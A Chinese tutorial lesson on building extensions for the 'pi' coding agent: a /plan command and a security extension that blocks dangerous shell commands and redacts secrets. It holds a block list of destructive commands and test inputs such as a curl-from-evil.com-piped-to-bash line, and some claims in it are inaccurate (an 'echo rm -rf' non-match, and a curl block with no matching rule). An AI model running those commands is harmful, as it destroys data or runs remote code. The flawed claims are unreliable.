# 第十六课: 扩展实战 -- 编写真实扩展

## 概述

上一课 (Lesson 15) 分析了 pi 的扩展系统架构: `ExtensionAPI` 接口、`ExtensionRunner` 的事件分发、`loader.ts` 的发现与加载机制。我们知道了扩展的骨架长什么样，但还没有亲手写过一个完整的扩展。

本课通过两个实战项目，覆盖扩展开发中最重要的三类模式:

1. **命令扩展 (Command Extension)**: `/plan` 命令 -- 注册斜杠命令、注入上下文、过滤消息
2. **安全审计扩展 (Security Extension)**: 拦截危险命令、过滤敏感输出、审计日志
3. **观察 vs 拦截 (Observe vs Intercept)**: 什么时候只读监听，什么时候修改行为

本课目标:

1. 掌握 `pi.registerCommand()` 的完整用法: handler、参数补全、UI 交互
2. 掌握 `pi.on("before_agent_start")` 注入系统提示词级别的指令
3. 掌握 `pi.on("context")` 过滤和清理上下文消息列表
4. 掌握 `pi.on("tool_call")` 拦截工具调用: 阻止、放行、修改参数
5. 掌握 `pi.on("tool_result")` 过滤工具输出: 脱敏、转换
6. 理解观察事件和拦截事件的区别
7. 理解扩展的测试策略

---

## 1. 扩展项目结构

一个包含多个扩展的项目的标准结构:

```
code/
  package.json          # pi.extensions 字段声明入口
  tsconfig.json
  src/
    types.ts            # 共享类型
    plan-extension.ts   # /plan 命令扩展
    security-extension.ts  # 安全审计扩展
    demo.ts             # 演示: 加载与事件流
```

### package.json 中的扩展声明

```json
{
  "pi": {
    "extensions": ["./src/plan-extension.ts", "./src/security-extension.ts"]
  }
}
```

pi 在启动时会检查当前目录的 `package.json`，如果存在 `pi.extensions` 字段，自动加载里面列出的扩展文件。这是项目级扩展的推荐方式 -- 不需要 `--extension` 标志，团队成员 clone 仓库后直接可用。

也可以通过命令行显式加载:

```bash
pi -e ./src/plan-extension.ts -e ./src/security-extension.ts
```

### 每个扩展文件的基本形状

```typescript
import type { ExtensionAPI } from "@earendil-works/pi-coding-agent";

export default function myExtension(pi: ExtensionAPI): void {
  // 注册命令
  pi.registerCommand("name", { ... });

  // 订阅事件
  pi.on("tool_call", async (event, ctx) => { ... });

  // 注册工具
  pi.registerTool({ ... });
}
```

工厂函数接收 `ExtensionAPI` 实例，在函数体内完成所有注册。pi 使用 jiti 加载 `.ts` 文件，无需编译步骤。

---

## 2. 实战一: /plan 命令扩展

### 2.1 需求分析

我们要构建一个 plan 命令，让用户可以:

- `/plan refactor the auth module` -- 创建一个执行计划
- `/plan status` -- 查看当前计划进度
- `/plan clear` -- 清除计划

核心行为:

1. 当用户输入 `/plan <goal>` 时，激活计划模式，让 agent 只生成计划而不执行
2. 通过 `before_agent_start` 注入指令，告诉 agent 当前处于计划模式
3. 通过 `context` 事件清理过期的计划指令，防止上下文膨胀
4. 跟踪 `[DONE:N]` 标记来追踪进度
5. 通过 `appendEntry` 持久化状态，支持会话恢复

### 2.2 命令注册: `pi.registerCommand()`

```typescript
pi.registerCommand("plan", {
  description: "Create, view, or clear an execution plan",

  getArgumentCompletions: (prefix) => {
    const subcommands = ["status", "clear"];
    const filtered = subcommands.filter((s) => s.startsWith(prefix));
    return filtered.length > 0 ? filtered.map((s) => ({ value: s, label: s })) : null;
  },

  handler: async (args, ctx) => {
    const trimmed = args.trim();

    if (trimmed === "status") {
      // 显示当前计划状态
      ctx.ui.notify(`Goal: ${planGoal}\n\n${formatSteps(steps)}`, "info");
      return;
    }

    if (trimmed === "clear") {
      planActive = false;
      planGoal = "";
      steps = [];
      ctx.ui.notify("Plan cleared.", "info");
      return;
    }

    // /plan <goal> -- 激活计划模式
    planActive = true;
    planGoal = trimmed;
    steps = [];

    // 发送用户消息触发 agent
    pi.sendUserMessage(
      `Create a detailed numbered plan for: ${trimmed}\n\n` +
        "Output ONLY the plan as a numbered list. Do NOT execute any steps yet.",
    );
  },
});
```

关键点:

| 概念                     | 说明                                                                 |
| ------------------------ | -------------------------------------------------------------------- |
| `handler(args, ctx)`     | `args` 是命令后面的文本，`ctx` 是 `ExtensionCommandContext`          |
| `getArgumentCompletions` | 返回补全建议列表，用户按 Tab 时触发                                  |
| `ctx.ui.notify()`        | 在 UI 中显示通知，第二个参数是级别: `"info"`, `"warning"`, `"error"` |
| `pi.sendUserMessage()`   | 以用户身份发送消息，触发新的 agent 轮次                              |

`handler` 和 `getArgumentCompletions` 是同步设计的关键区别:

- `handler` 是 `async` -- 可以等待 UI 交互 (`ctx.ui.select`, `ctx.ui.confirm`)
- `getArgumentCompletions` 是同步的 -- 必须立即返回结果

### 2.3 上下文注入: `pi.on("before_agent_start")`

`before_agent_start` 在每个 agent 轮次开始前触发。它的返回值可以:

- 注入一条消息到上下文 (`message`)
- 替换系统提示词 (`systemPrompt`)

```typescript
pi.on("before_agent_start", async () => {
  if (!planActive) return;

  // 情况 1: 还没有生成计划步骤，注入计划创建指令
  if (steps.length === 0) {
    return {
      message: {
        customType: "plan-instruction",
        content:
          "[PLAN MODE]\n" +
          "You are in planning mode. Create a clear numbered plan.\n" +
          "Rules:\n" +
          "- Output a numbered list (1. 2. 3. ...)\n" +
          "- Each step should be concrete and actionable\n" +
          "- Do NOT execute any steps\n" +
          "- Use read-only tools for research if needed",
        display: false, // 不在 UI 中显示，但发送给 LLM
      },
    };
  }

  // 情况 2: 已有计划步骤，注入进度上下文
  const remaining = steps.filter((s) => !s.completed);
  if (remaining.length === 0) return;

  return {
    message: {
      customType: "plan-progress",
      content:
        "[PLAN EXECUTION PROGRESS]\n" +
        `Remaining steps:\n${remaining.map((s) => `${s.number}. ${s.text}`).join("\n")}\n\n` +
        "Execute the next step. After completing it, include [DONE:N].",
      display: false,
    },
  };
});
```

注入消息的核心属性:

| 属性         | 类型      | 说明                              |
| ------------ | --------- | --------------------------------- |
| `customType` | `string`  | 自定义消息类型标识，用于后续过滤  |
| `content`    | `string`  | 消息内容文本                      |
| `display`    | `boolean` | `false` = 隐藏于 UI，仅发送给 LLM |

`display: false` 是关键设计。计划指令是给 LLM 看的元指令，不应该出现在用户的对话界面中。但它确实存在于发送给 LLM 的消息列表中，指导 LLM 的行为。

### 2.4 上下文过滤: `pi.on("context")`

`context` 事件在 agent 构建发送给 LLM 的消息列表时触发。扩展可以:

- 过滤掉不再需要的消息
- 添加合成消息
- 重新排序消息

```typescript
pi.on("context", async (event) => {
  // 计划模式关闭时，清理所有计划相关的注入消息
  if (!planActive) {
    return {
      messages: event.messages.filter((m) => {
        const msg = m as AgentMessage & { customType?: string };
        if (msg.customType === "plan-instruction") return false;
        if (msg.customType === "plan-progress") return false;
        return true;
      }),
    };
  }

  // 计划模式开启时，去重: 只保留最新的 plan-instruction
  let seenInstruction = false;
  const reversed = [...event.messages].reverse();
  const filtered = reversed.filter((m) => {
    const msg = m as AgentMessage & { customType?: string };
    if (msg.customType === "plan-instruction") {
      if (seenInstruction) return false;
      seenInstruction = true;
    }
    return true;
  });
  return { messages: filtered.reverse() };
});
```

为什么需要上下文过滤？

每次 `before_agent_start` 注入一条消息，这条消息就会被加入会话历史。经过多个轮次后，上下文中可能积累了大量过期的计划指令。`context` 事件让我们在发送给 LLM 之前清理这些冗余消息。

这是一个重要的模式: **注入 + 清理**。`before_agent_start` 负责注入，`context` 负责清理。两者配合使用，确保 LLM 始终看到精简、相关的上下文。

### 2.5 状态持久化: `pi.appendEntry()` 与 `session_start`

扩展状态默认存在于内存中。当用户关闭 pi 再重新打开 (恢复会话) 时，内存状态丢失。`appendEntry` 解决这个问题:

```typescript
// 保存状态
pi.appendEntry("plan-state", { goal: planGoal, steps });

// 恢复状态
pi.on("session_start", async (_event, ctx) => {
  const entries = ctx.sessionManager.getEntries();

  const planEntry = entries
    .filter((e) => e.type === "custom" && e.customType === "plan-state")
    .pop(); // 取最后一条

  if (planEntry?.data) {
    planGoal = planEntry.data.goal;
    steps = planEntry.data.steps;
    planActive = steps.some((s) => !s.completed);
  }
});
```

`appendEntry(customType, data)` 将数据作为自定义条目写入会话存储。这些条目不会发送给 LLM，但在会话恢复时可以通过 `ctx.sessionManager.getEntries()` 读取。

---

## 3. 实战二: 安全审计扩展

### 3.1 需求分析

安全审计扩展需要:

1. **拦截危险命令**: 当 agent 尝试执行 `rm -rf`、`mkfs`、`dd of=/dev/` 等命令时，阻止执行
2. **过滤敏感输出**: 当工具输出包含 API key、密码、私钥等敏感信息时，自动脱敏
3. **审计日志**: 记录所有拦截和脱敏事件，通过 `/audit` 命令查看

### 3.2 工具调用拦截: `pi.on("tool_call")`

`tool_call` 事件在工具执行**之前**触发。扩展可以:

- 返回 `{ block: true, reason: "..." }` 阻止执行
- 返回 `undefined` 放行
- 直接修改 `event.input` 来改变工具参数 (原地修改)

```typescript
const DANGEROUS_PATTERNS: DangerousPattern[] = [
  { label: "recursive delete", pattern: /\brm\s+(-[a-zA-Z]*r[a-zA-Z]*f|--recursive)\b/ },
  { label: "disk format", pattern: /\bmkfs\b/ },
  { label: "disk overwrite", pattern: /\bdd\b.*\bof=\/dev\// },
  { label: "permission escalation", pattern: /\bchmod\s+(-[a-zA-Z]*\s+)?777\s/ },
  { label: "fork bomb", pattern: /:\(\)\s*\{\s*:\|:&\s*\}/ },
];

pi.on("tool_call", async (event, ctx) => {
  if (event.toolName !== "bash") return undefined;

  const command = event.input.command as string;

  for (const rule of DANGEROUS_PATTERNS) {
    if (rule.pattern.test(command)) {
      if (ctx.hasUI) {
        ctx.ui.notify(`Blocked: ${rule.label}\n${command}`, "warning");
      }
      return {
        block: true,
        reason: `Security: command blocked (${rule.label}).`,
      };
    }
  }

  return undefined; // 放行
});
```

`tool_call` 事件的关键属性:

| 属性               | 类型                      | 说明                                                                                  |
| ------------------ | ------------------------- | ------------------------------------------------------------------------------------- |
| `event.toolName`   | `string`                  | 工具名: `"bash"`, `"read"`, `"edit"`, `"write"`, `"grep"`, `"find"`, `"ls"`, 或自定义 |
| `event.input`      | `Record<string, unknown>` | 工具参数，按工具类型不同而不同                                                        |
| `event.toolCallId` | `string`                  | 唯一的工具调用 ID                                                                     |
| `ctx.hasUI`        | `boolean`                 | 是否有 UI (非交互模式下为 `false`)                                                    |

返回值的语义:

```typescript
// 阻止执行
return { block: true, reason: "..." };

// 放行 (等价于不返回任何东西)
return undefined;

// 修改参数 (原地修改，不通过返回值)
event.input.command = sanitizedCommand;
return undefined;
```

注意: 当多个扩展都注册了 `tool_call` 处理器时，它们按注册顺序依次执行。如果任何一个返回 `{ block: true }`，后续处理器不会被调用，工具执行被跳过。

### 3.3 工具结果过滤: `pi.on("tool_result")`

`tool_result` 事件在工具执行**之后**触发。扩展可以修改返回给 LLM 的内容:

```typescript
const SENSITIVE_PATTERNS: SensitivePattern[] = [
  {
    label: "AWS access key",
    pattern: /(AKIA[0-9A-Z]{16})/g,
    replacement: "AKIA****************",
  },
  {
    label: "generic API key assignment",
    pattern: /(api[_-]?key\s*[:=]\s*["']?)([a-zA-Z0-9_-]{20,})/gi,
    replacement: "$1[REDACTED]",
  },
  {
    label: "bearer token",
    pattern: /(Bearer\s+)([a-zA-Z0-9._-]{20,})/g,
    replacement: "$1[REDACTED]",
  },
  {
    label: "private key block",
    pattern:
      /(-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----)([\s\S]*?)(-----END\s+(RSA\s+)?PRIVATE\s+KEY-----)/g,
    replacement: "$1\n[REDACTED]\n$4",
  },
];

pi.on("tool_result", async (event) => {
  let modified = false;

  const newContent = event.content.map((block) => {
    if (block.type !== "text") return block;

    let text = (block as TextContent).text;

    for (const rule of SENSITIVE_PATTERNS) {
      rule.pattern.lastIndex = 0; // 重置全局正则的 lastIndex
      if (rule.pattern.test(text)) {
        rule.pattern.lastIndex = 0;
        text = text.replace(rule.pattern, rule.replacement);
        modified = true;
      }
    }

    return { type: "text" as const, text };
  });

  if (modified) {
    return { content: newContent };
  }

  return undefined;
});
```

`tool_result` 事件的关键属性:

| 属性             | 类型                              | 说明               |
| ---------------- | --------------------------------- | ------------------ |
| `event.content`  | `(TextContent \| ImageContent)[]` | 工具输出内容块列表 |
| `event.isError`  | `boolean`                         | 工具是否执行出错   |
| `event.toolName` | `string`                          | 工具名             |
| `event.details`  | `unknown`                         | 工具特定的详情数据 |

返回值的语义:

```typescript
// 修改输出内容
return { content: newContent };

// 修改错误状态
return { content: newContent, isError: false };

// 不修改
return undefined;
```

全局正则的陷阱: 使用 `/g` 标志的正则表达式有状态 (`lastIndex`)。在 `test()` 之后如果要用 `replace()`，必须先重置 `lastIndex = 0`，否则 `replace` 会从上次匹配位置开始。

### 3.4 类型守卫: 按工具类型缩窄事件

`ToolResultEvent` 是一个联合类型。pi 提供了类型守卫来缩窄类型:

```typescript
import {
  isBashToolResult,
  isReadToolResult,
  type BashToolResultEvent,
} from "@earendil-works/pi-coding-agent";

pi.on("tool_result", async (event) => {
  if (isBashToolResult(event)) {
    // event 的类型被缩窄为 BashToolResultEvent
    // event.details 的类型是 BashToolDetails | undefined
    const exitCode = event.details?.exitCode;
  }

  if (isReadToolResult(event)) {
    // event.details 的类型是 ReadToolDetails | undefined
  }
});
```

对于 `ToolCallEvent`，使用 `isToolCallEventType`:

```typescript
import { isToolCallEventType } from "@earendil-works/pi-coding-agent";

pi.on("tool_call", async (event) => {
  if (isToolCallEventType("bash", event)) {
    // event.input.command 被正确类型化为 string
  }
});
```

---

## 4. 观察 vs 拦截模式

pi 的事件系统中，事件分为两类:

### 4.1 观察事件 (Observe)

这些事件的处理器返回值被忽略。扩展只能读取事件数据，不能修改行为:

| 事件                    | 触发时机             |
| ----------------------- | -------------------- |
| `agent_start`           | agent 会话开始       |
| `agent_end`             | agent 会话结束       |
| `turn_start`            | agent 开始一个新轮次 |
| `turn_end`              | agent 完成一个轮次   |
| `message_start`         | LLM 开始生成消息     |
| `message_update`        | LLM 流式输出更新     |
| `tool_execution_start`  | 工具开始执行         |
| `tool_execution_update` | 工具执行中间更新     |
| `tool_execution_end`    | 工具执行完成         |
| `model_select`          | 用户切换模型         |
| `thinking_level_select` | 用户切换思考级别     |

观察事件适合: 日志、指标收集、UI 状态更新、通知。

```typescript
// 观察模式: 记录每个 agent 轮次的用时
let turnStartTime = 0;

pi.on("turn_start", async () => {
  turnStartTime = Date.now();
});

pi.on("turn_end", async (_event, ctx) => {
  const duration = Date.now() - turnStartTime;
  ctx.ui.setStatus("timing", `${(duration / 1000).toFixed(1)}s`);
});
```

### 4.2 拦截事件 (Intercept)

这些事件的处理器返回值会改变系统行为:

| 事件                     | 返回值效果                                                                 |
| ------------------------ | -------------------------------------------------------------------------- |
| `tool_call`              | `{ block: true }` 阻止执行; 修改 `event.input` 改变参数                    |
| `tool_result`            | `{ content }` 替换输出内容                                                 |
| `before_agent_start`     | `{ message }` 注入上下文; `{ systemPrompt }` 替换系统提示词                |
| `context`                | `{ messages }` 替换消息列表                                                |
| `input`                  | `{ action: "handled" }` 吞掉输入; `{ action: "transform", text }` 改写输入 |
| `message_end`            | `{ message }` 替换最终消息                                                 |
| `session_before_switch`  | `{ cancel: true }` 取消切换                                                |
| `session_before_fork`    | `{ cancel: true }` 取消分支                                                |
| `session_before_compact` | `{ cancel: true }` 取消压缩; `{ compaction }` 自定义压缩结果               |

拦截事件适合: 安全策略、输入预处理、输出后处理、工作流控制。

### 4.3 选择指南

```
需要修改系统行为？
  ├─ 是 → 使用拦截事件
  │   ├─ 阻止/修改工具调用 → tool_call
  │   ├─ 过滤/脱敏输出    → tool_result
  │   ├─ 注入上下文       → before_agent_start
  │   ├─ 清理消息列表     → context
  │   ├─ 预处理用户输入   → input
  │   └─ 取消会话操作     → session_before_*
  │
  └─ 否 → 使用观察事件
      ├─ 记录日志         → agent_start, agent_end, turn_*
      ├─ 更新 UI 状态     → turn_start, turn_end, message_*
      ├─ 追踪进度         → tool_execution_*
      └─ 收集指标         → message_update, turn_end
```

---

## 5. 扩展测试策略

### 5.1 单元测试: 纯函数提取

扩展中的核心逻辑应该提取为纯函数，独立于 pi 运行时测试:

```typescript
// plan-extension 中的纯函数
function parsePlanSteps(text: string): PlanStep[] {
  const result: PlanStep[] = [];
  const regex = /^\s*(\d+)[.)]\s+(.+)$/gm;
  let match: RegExpExecArray | null;
  while ((match = regex.exec(text)) !== null) {
    result.push({
      number: parseInt(match[1], 10),
      text: match[2].trim(),
      completed: false,
    });
  }
  return result;
}

// 测试
assert.deepEqual(parsePlanSteps("1. Read the file\n2. Parse the content"), [
  { number: 1, text: "Read the file", completed: false },
  { number: 2, text: "Parse the content", completed: false },
]);
```

安全扩展的正则匹配同理:

```typescript
// 测试危险命令检测
const rmPattern = /\brm\s+(-[a-zA-Z]*r[a-zA-Z]*f|--recursive)\b/;
assert(rmPattern.test("rm -rf /tmp/old"));
assert(rmPattern.test("rm --recursive /tmp/old"));
assert(!rmPattern.test("rm file.txt"));
assert(!rmPattern.test("echo rm -rf")); // 不在 word boundary

// 测试敏感数据脱敏
const apiKeyPattern = /(api[_-]?key\s*[:=]\s*["']?)([a-zA-Z0-9_-]{20,})/gi;
const input = "API_KEY=sk-live-abc123def456ghi789jkl012";
const result = input.replace(apiKeyPattern, "$1[REDACTED]");
assert.equal(result, "API_KEY=[REDACTED]");
```

### 5.2 集成测试: faux provider

pi 的测试框架 (`packages/coding-agent/test/suite/harness.ts`) 支持以编程方式加载扩展，配合 faux provider 模拟 LLM 响应:

```typescript
import { createTestSession } from "./harness.js";
import planExtension from "../src/plan-extension.js";
import securityExtension from "../src/security-extension.js";

const session = await createTestSession({
  extensions: [planExtension, securityExtension],
  fauxResponses: [
    // 模拟 agent 尝试执行 rm -rf
    {
      toolCalls: [{ name: "bash", input: { command: "rm -rf /important" } }],
    },
  ],
});

// 验证命令被阻止
const result = await session.run();
assert(result.toolResults[0].isError);
assert(result.toolResults[0].content.includes("blocked"));
```

### 5.3 手动测试

扩展开发中最常用的测试方式:

```bash
# 加载扩展启动 pi
pi -e ./src/security-extension.ts

# 在 pi 中测试
> please run: rm -rf /tmp/test
# 预期: 看到 "Blocked dangerous command" 通知

> please read the file .env
# 预期: 如果 .env 中有 API_KEY=sk-..., 输出中显示 [REDACTED]

> /audit
# 预期: 看到审计日志列表
```

---

## 6. 事件流全景

当用户在同时加载两个扩展的情况下输入 `/plan refactor auth` 时，事件流如下:

```
用户输入: /plan refactor auth
  │
  ├─ pi 路由到 plan-extension 的 registerCommand handler
  │   ├─ 设置 planActive = true, planGoal = "refactor auth"
  │   └─ 调用 pi.sendUserMessage("Create a detailed numbered plan for: ...")
  │
  ├─ before_agent_start
  │   ├─ plan-extension: 返回 { message: { customType: "plan-instruction", ... } }
  │   └─ security-extension: (无 before_agent_start handler)
  │
  ├─ context
  │   ├─ plan-extension: 去重 plan-instruction 消息
  │   └─ security-extension: (无 context handler)
  │
  ├─ agent_start
  │   └─ security-extension: 记录审计日志 "session started"
  │
  ├─ [LLM 生成响应: "Plan:\n1. Analyze auth module\n2. ..."]
  │
  ├─ turn_end
  │   └─ plan-extension: 解析 [DONE:N] 标记，更新步骤状态
  │
  └─ agent_end
      └─ security-extension: 记录审计日志 "session ended"
```

如果 agent 在计划执行阶段尝试 `rm -rf`:

```
agent 请求工具调用: bash { command: "rm -rf old_auth/" }
  │
  ├─ tool_call
  │   ├─ security-extension: 匹配 "recursive delete" 规则
  │   │   └─ 返回 { block: true, reason: "..." }
  │   └─ plan-extension: (不会被调用，因为 security 已经 block)
  │
  └─ agent 收到错误: "Security: command blocked (recursive delete)"
```

---

## 7. 常见陷阱

### 7.1 忘记检查 `ctx.hasUI`

在非交互模式 (如 API 调用、CI 环境) 下，`ctx.hasUI` 为 `false`。调用 `ctx.ui.notify()` 会抛异常:

```typescript
// 错误: 非交互模式下崩溃
pi.on("tool_call", async (event, ctx) => {
  ctx.ui.notify("blocked!", "warning"); // ctx.hasUI 可能为 false
  return { block: true, reason: "..." };
});

// 正确: 先检查
pi.on("tool_call", async (event, ctx) => {
  if (ctx.hasUI) {
    ctx.ui.notify("blocked!", "warning");
  }
  return { block: true, reason: "..." };
});
```

### 7.2 全局正则的 `lastIndex` 陷阱

```typescript
const pattern = /secret/g;

// 第一次: 匹配成功, lastIndex 变为 6
pattern.test("secret");

// 第二次: 从 lastIndex=6 开始搜索, 匹配失败!
pattern.test("secret"); // false!

// 解决: 每次使用前重置
pattern.lastIndex = 0;
```

### 7.3 `before_agent_start` 消息累积

每次 `before_agent_start` 注入的消息都会进入会话历史。经过 10 个轮次，就有 10 条注入消息。必须配合 `context` 事件清理旧消息:

```typescript
// 只注入不清理 = 上下文爆炸
pi.on("before_agent_start", () => ({
  message: { content: "长指令...", display: false },
}));

// 注入 + 清理 = 正确模式
pi.on("before_agent_start", () => ({
  message: { customType: "my-ctx", content: "长指令...", display: false },
}));
pi.on("context", (event) => {
  // 只保留最新的 my-ctx 消息
  let seen = false;
  const filtered = [...event.messages].reverse().filter((m) => {
    if (m.customType === "my-ctx") {
      if (seen) return false;
      seen = true;
    }
    return true;
  });
  return { messages: filtered.reverse() };
});
```

### 7.4 拦截顺序的不确定性

多个扩展注册同一个拦截事件时，按加载顺序执行。如果扩展 A 修改了 `event.input`，扩展 B 看到的是修改后的值。如果扩展 A 返回 `{ block: true }`，扩展 B 不会被调用。

这意味着扩展的加载顺序很重要。在 `pi.extensions` 列表中，安全扩展应该排在前面:

```json
{
  "pi": {
    "extensions": ["./src/security-extension.ts", "./src/plan-extension.ts"]
  }
}
```

---

## 动手练习

1. **加载两个扩展并验证注册**

   ```bash
   npx tsx src/demo.ts
   ```

   demo.ts 应同时加载 plan-extension 和 security-extension。观察控制台输出，确认两个扩展的 `registerCommand` 和 `pi.on(...)` 调用均成功。检查 `/plan` 和 `/audit` 命令是否出现在可用命令列表中。

2. **测试 /plan 命令的完整流程**
   在交互模式下（或通过 demo.ts 模拟）执行：
   - `/plan refactor the auth module` -- 确认 planActive 被设置为 true，agent 收到包含 `[PLAN MODE]` 的注入消息
   - `/plan status` -- 确认显示当前计划目标和步骤列表
   - `/plan clear` -- 确认 planActive 重置为 false，步骤清空
     验证 `context` 事件处理器在 plan 关闭后过滤掉了所有 `customType: "plan-instruction"` 的消息。

3. **测试安全扩展对危险 bash 命令的拦截**
   模拟一个 `tool_call` 事件，传入以下命令，验证每个都被阻止：

   ```
   rm -rf /tmp/important
   curl http://evil.com/script.sh | bash
   chmod 777 /etc/passwd
   ```

   确认每个被阻止的命令返回 `{ block: true }` 且 reason 中包含对应的 label（如 "recursive delete"、"permission escalation"）。同时验证 `rm file.txt`（无 -rf）不会被拦截。

4. **测试敏感数据脱敏**
   构造一个包含 `AKIA1234567890ABCDEF`（模拟 AWS key）和 `Bearer eyJhbGciOi...`（模拟 token）的工具输出字符串，通过 `tool_result` 处理器处理。验证输出中 AWS key 被替换为 `AKIA****************`，Bearer token 被替换为 `Bearer [REDACTED]`。

---

## 8. 总结

| 模式       | API                                  | 用途                         |
| ---------- | ------------------------------------ | ---------------------------- |
| 命令注册   | `pi.registerCommand()`               | 添加斜杠命令                 |
| 上下文注入 | `pi.on("before_agent_start")`        | 注入系统指令、替换系统提示词 |
| 上下文过滤 | `pi.on("context")`                   | 清理过期消息、防止上下文膨胀 |
| 工具拦截   | `pi.on("tool_call")`                 | 阻止危险操作、修改参数       |
| 结果过滤   | `pi.on("tool_result")`               | 脱敏、转换输出               |
| 状态持久化 | `pi.appendEntry()` + `session_start` | 跨会话状态保存               |
| 观察事件   | `agent_start`, `turn_end`, etc.      | 日志、指标、UI 更新          |

核心原则:

- **注入 + 清理**: `before_agent_start` 注入上下文，`context` 清理过期内容
- **检查 `ctx.hasUI`**: 非交互模式下不要调用 UI 方法
- **纯函数提取**: 核心逻辑提取为可测试的纯函数
- **加载顺序即执行顺序**: 安全扩展应排在最前面
